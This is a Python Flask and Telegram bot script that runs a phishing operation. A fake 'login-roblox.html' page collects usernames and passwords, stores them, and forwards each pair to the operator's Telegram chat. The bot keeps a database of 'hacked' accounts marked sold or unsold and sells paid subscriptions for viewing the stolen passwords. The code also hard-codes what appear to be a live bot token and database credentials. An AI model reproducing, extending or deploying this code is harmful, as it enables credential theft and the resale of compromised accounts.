from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
from datetime import datetime, timedelta

# === Настройки ===
TOKEN = '8028944732:AAFGduJrXNp9IcIRxi5fTZpNzQaamHDglw4'  # Ваш токен
ADMIN_CHAT_ID = '6956377285'  # Ваш chat_id (Создатель)
DATABASE_URL = os.getenv('DATABASE_URL', 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a/roblox_db')
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === Змінні для техперериву ===
tech_break = None  # Час закінчення техперериву

# === Ініціалізація бази даних ===
def get_db_connection():
    try:
        conn = psycopg2.connect(DATABASE_URL)
        print("DB connection successful")
        return conn
    except Exception as e:
        print(f"DB connection failed: {e}")
        return None

def init_db():
    conn = get_db_connection()
    if conn is None:
        return
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                 (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                 (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
    # Додаємо Создателя за замовчуванням
    subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()
    c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
              "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
              (ADMIN_CHAT_ID, "Создатель", subscription_end, "Создатель", subscription_end))
    conn.commit()
    conn.close()
    print("DB initialized")

# === Keep-alive для Render ===
def keep_alive():
    while True:
        try:
            requests.get(SITE_URL)
            print("🔁 Keep-alive ping sent")
        except Exception as e:
            print(f"Keep-alive failed: {e}")
        time.sleep(300)

# === Функції для роботи з базою ===
def get_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        return None
    c = conn.cursor()
    c.execute("SELECT prefix, subscription_end, site_clicks, password_views FROM users WHERE chat_id = %s", (chat_id,))
    result = c.fetchone()
    conn.close()
    if result:
        return {
            'prefix': result[0],
            'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
            'site_clicks': result[2],
            'password_views': result[3]
        }
    return None

def save_user(chat_id, prefix, subscription_end):
    conn = get_db_connection()
    if conn is None:
        return
    c = conn.cursor()
    c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
              "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
              (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
    conn.commit()
    conn.close()

def delete_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        return
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
    conn.commit()
    conn.close()

def track_user_activity(chat_id, action):
    conn = get_db_connection()
    if conn is None:
        return
    c = conn.cursor()
    c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, 'Посетитель', %s) "
              "ON CONFLICT (chat_id) DO NOTHING", (chat_id, datetime.now().isoformat()))
    if action == 'site':
        c.execute("UPDATE users SET site_clicks = site_clicks + 1 WHERE chat_id = %s", (chat_id,))
    elif action == 'passwords':
        c.execute("UPDATE users SET password_views = password_views + 1 WHERE chat_id = %s", (chat_id,))
    conn.commit()
    conn.close()

def save_credential(login, password):
    conn = get_db_connection()
    if conn is None:
        return
    added_time = datetime.now().strftime('%Y-%m-%d %H:%M')
    c = conn.cursor()
    c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
              "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
              (login, password, added_time, password, added_time))
    conn.commit()
    conn.close()

def get_all_credentials():
    conn = get_db_connection()
    if conn is None:
        return []
    c = conn.cursor()
    c.execute("SELECT login, password, added_time FROM credentials")
    result = c.fetchall()
    conn.close()
    return [{'login': r[0], 'password': r[1], 'added_time': r[2]} for r in result]

def save_hacked_account(login, password, prefix="Взломан", sold_status="Не продан", linked_chat_id=None):
    conn = get_db_connection()
    if conn is None:
        return
    hack_date = datetime.now().strftime('%Y-%m-%d %H:%M')
    c = conn.cursor()
    c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
              "VALUES (%s, %s, %s, %s, %s, %s) "
              "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
              (login, password, hack_date, prefix, sold_status, linked_chat_id,
               password, hack_date, prefix, sold_status, linked_chat_id))
    conn.commit()
    conn.close()

def get_all_hacked_accounts():
    conn = get_db_connection()
    if conn is None:
        return []
    c = conn.cursor()
    c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
    result = c.fetchall()
    conn.close()
    return [{'login': r[0], 'password': r[1], 'hack_date': r[2], 'prefix': r[3], 'sold_status': r[4], 'linked_chat_id': r[5]} for r in result]

def delete_hacked_account(login):
    conn = get_db_connection()
    if conn is None:
        return False
    c = conn.cursor()
    c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
    rows_affected = c.rowcount
    conn.commit()
    conn.close()
    return rows_affected > 0

def get_all_users():
    conn = get_db_connection()
    if conn is None:
        return []
    c = conn.cursor()
    c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
    result = c.fetchall()
    conn.close()
    return [{'chat_id': r[0], 'prefix': r[1], 'subscription_end': datetime.fromisoformat(r[2]) if r[2] else None, 
             'site_clicks': r[3], 'password_views': r[4]} for r in result]

# === Перевірка доступу ===
def check_access(chat_id, command):
    global tech_break
    if tech_break and chat_id != ADMIN_CHAT_ID:
        time_left = (tech_break - datetime.now()).total_seconds() / 60
        if time_left > 0:
            return f"⏳ Сейчас проходит техперерыв. Конец будет через {int(time_left)} минут."
    user = get_user(chat_id)
    if not user or user['prefix'] == 'Посетитель':
        return "🔒 Вы можете купить подписку у @sacoectasy."
    if user['subscription_end'] and user['subscription_end'] < datetime.now():
        save_user(chat_id, 'Посетитель', datetime.now())  # Скидаємо до Посетителя, якщо підписка закінчилася
        return "🔒 Ваша подписка истекла! Купите новую у @sacoectasy."
    if command in ['passwords', 'admin'] and user['prefix'] not in ['Админ', 'Создатель']:
        return "🔒 Доступно только для Админа и Создателя!"
    if command in ['hacked', 'database', 'techstop', 'adprefix', 'delprefix'] and user['prefix'] != 'Создатель':
        return "🔒 Доступно только для Создателя!"
    return None

# === Flask маршрути для сайту ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        login = request.form.get('login')
        password = request.form.get('password')
        if login and password:
            save_credential(login, password)
            print(f"Received login: {login}, password: {password}")
            bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")
        return redirect(url_for('not_found'))
    except Exception as e:
        print(f"Error in /submit: {e}")
        return "Internal Server Error", 500

@app.route('/404')
def not_found():
    return render_template('404.html')

# === Webhook для Telegram ===
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        print("Webhook processed update")
        return 'OK', 200
    print("Invalid webhook request")
    return 'Invalid request', 400

@app.route('/setup', methods=['GET'])
def setup():
    try:
        bot.remove_webhook()
        webhook_url = f"{SITE_URL}/webhook"
        bot.set_webhook(url=webhook_url)
        init_db()
        print(f"Webhook set to {webhook_url}")
        return "Webhook and DB set", 200
    except Exception as e:
        print(f"Setup failed: {e}")
        return f"Setup failed: {e}", 500

# === Команди бота ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /start for chat_id: {chat_id}")
    track_user_activity(chat_id, None)
    access = check_access(chat_id, 'start')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, "✅ Бот активен! Используйте /menu для списка команд.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /menu for chat_id: {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        bot.reply_to(message, access)
        return
    response = "🧾 Доступные команды:\n/start - Запустить бота\n/menu - Показать это меню\n/site - Получить ссылку на сайт\n/getchatid - Узнать ваш Chat ID"
    user = get_user(chat_id)
    if user['prefix'] in ['Пользователь', 'Админ', 'Создатель']:
        response += "\n/passwords - Посмотреть пароли"
    if user['prefix'] in ['Админ', 'Создатель']:
        response += "\n/admin - Админ-панель"
    if user['prefix'] == 'Создатель':
        response += "\n/hacked - Взломанные аккаунты\n/database - Управление данными\n/techstop - Техперерыв\n/adprefix - Добавить префикс\n/delprefix - Удалить префикс"
    bot.reply_to(message, response)

@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /site for chat_id: {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        bot.reply_to(message, access)
        return
    track_user_activity(chat_id, 'site')
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /getchatid for chat_id: {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, f"Ваш Chat ID: {chat_id}")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /passwords for chat_id: {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.reply_to(message, access)
        return
    track_user_activity(chat_id, 'passwords')
    credentials_list = get_all_credentials()
    if not credentials_list:
        bot.reply_to(message, "📭 Список паролей пуст!")
        return
    response = "🔑 Список паролей:\n\n"
    for cred in credentials_list:
        response += f"Логин: {cred['login']}\nПароль: {cred['password']}\nДобавлено: {cred['added_time']}\n\n"
    if len(response) > 4096:
        parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /hacked for chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        hacked_list = get_all_hacked_accounts()
        if not hacked_list:
            bot.reply_to(message, "📭 Список взломанных аккаунтов пуст!")
            return
        response = "📋 Список взломанных аккаунтов:\n\n"
        for acc in hacked_list:
            response += (f"Логин: {acc['login']}\nПароль: {acc['password']}\n"
                        f"Дата взлома: {acc['hack_date']}\nПрефикс: {acc['prefix']}\n"
                        f"Статус: {acc['sold_status']}\nПривязка: {acc['linked_chat_id'] or 'Нет'}\n\n")
        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
        return
    if args[0] == "add" and len(args) >= 3:
        login, password = args[1], args[2]
        prefix = args[3] if len(args) > 3 else "Взломан"
        sold_status = args[4] if len(args) > 4 else "Не продан"
        linked_chat_id = args[5] if len(args) > 5 else None
        save_hacked_account(login, password, prefix, sold_status, linked_chat_id)
        bot.reply_to(message, f"✅ Аккаунт {login} добавлен в список взломанных!")
    elif args[0] == "delete" and len(args) == 2:
        login = args[1]
        if delete_hacked_account(login):
            bot.reply_to(message, f"✅ Аккаунт {login} удален из списка взломанных!")
        else:
            bot.reply_to(message, "❌ Аккаунт не найден!")

@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /database for chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    users_list = get_all_users()
    credentials_list = get_all_credentials()
    hacked_list = get_all_hacked_accounts()
    response = "🗄️ База данных:\n\n"
    response += "👥 Пользователи:\n"
    if not users_list:
        response += "Пусто\n"
    else:
        for user in users_list:
            time_left = (user['subscription_end'] - datetime.now()).days if user['subscription_end'] else 0
            time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
            response += (f"Chat ID: {user['chat_id']}, Префикс: {user['prefix']}, "
                        f"Подписка: {time_str}, Клики на сайт: {user['site_clicks']}, "
                        f"Просмотры паролей: {user['password_views']}\n")
    response += "\n🔑 Пароли:\n"
    if not credentials_list:
        response += "Пусто\n"
    else:
        for cred in credentials_list:
            response += f"Логин: {cred['login']}, Пароль: {cred['password']}, Добавлено: {cred['added_time']}\n"
    response += "\n🔓 Взломанные аккаунты:\n"
    if not hacked_list:
        response += "Пусто\n"
    else:
        for acc in hacked_list:
            response += (f"Логин: {acc['login']}, Пароль: {acc['password']}, "
                        f"Дата: {acc['hack_date']}, Префикс: {acc['prefix']}, "
                        f"Статус: {acc['sold_status']}, Привязка: {acc['linked_chat_id'] or 'Нет'}\n")
    response += "\n📝 Управление:\n/hacked add <login> <password> [prefix] [sold_status] [linked_chat_id]\n/hacked delete <login>"
    if len(response) > 4096:
        parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /admin for chat_id: {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        bot.reply_to(message, access)
        return
    users_list = get_all_users()
    credentials_list = get_all_credentials()
    hacked_list = get_all_hacked_accounts()
    users_count = len(users_list)
    passwords_count = len(credentials_list)
    hacked_count = len(hacked_list)
    response = (f"⚙️ Админ-панель:\nПользователей: {users_count}\nПаролей: {passwords_count}\n"
                f"Взломанных аккаунтов: {hacked_count}\n\n")
    user = get_user(chat_id)
    if user['prefix'] == 'Создатель':
        response += "📋 Активность пользователей:\n"
        if not users_list:
            response += "Нет зарегистрированных пользователей.\n"
        else:
            for user_data in users_list:
                time_left = (user_data['subscription_end'] - datetime.now()).days if user_data['subscription_end'] else 0
                time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
                response += (f"Chat ID: {user_data['chat_id']}\nПрефикс: {user_data['prefix']}\n"
                            f"Подписка: {time_str}\nКлики на сайт: {user_data['site_clicks']}\n"
                            f"Просмотры паролей: {user_data['password_views']}\n\n")
    response += "📜 Доступные команды:\n/start\n/menu\n/site\n/getchatid\n/passwords\n/admin"
    if user['prefix'] == 'Создатель':
        response += "\n/hacked\n/database\n/techstop\n/adprefix\n/delprefix"
    if len(response) > 4096:
        parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /techstop for chat_id: {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args or not args[0].isdigit():
        bot.reply_to(message, "❌ Укажите время в минутах: /techstop <минуты>")
        return
    minutes = int(args[0])
    tech_break = datetime.now() + timedelta(minutes=minutes)
    bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Конец: {tech_break.strftime('%H:%M')}")

@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /adprefix for chat_id: {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 3 or not args[2].isdigit():
        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <prefix> <days>")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    if prefix not in ['Посетитель', 'Пользователь', 'Админ', 'Создатель']:
        bot.reply_to(message, "❌ Префикс должен быть: Посетитель, Пользователь, Админ, Создатель")
        return
    subscription_end = datetime.now() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    bot.reply_to(message, f"✅ Префикс {prefix} установлен для {target_chat_id} на {days} дней!")

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /delprefix for chat_id: {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 1:
        bot.reply_to(message, "❌ Формат: /delprefix <chat_id>")
        return
    target_chat_id = args[0]
    delete_user(target_chat_id)
    bot.reply_to(message, f"✅ Префикс удален для {target_chat_id}!")

if __name__ == "__main__":
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
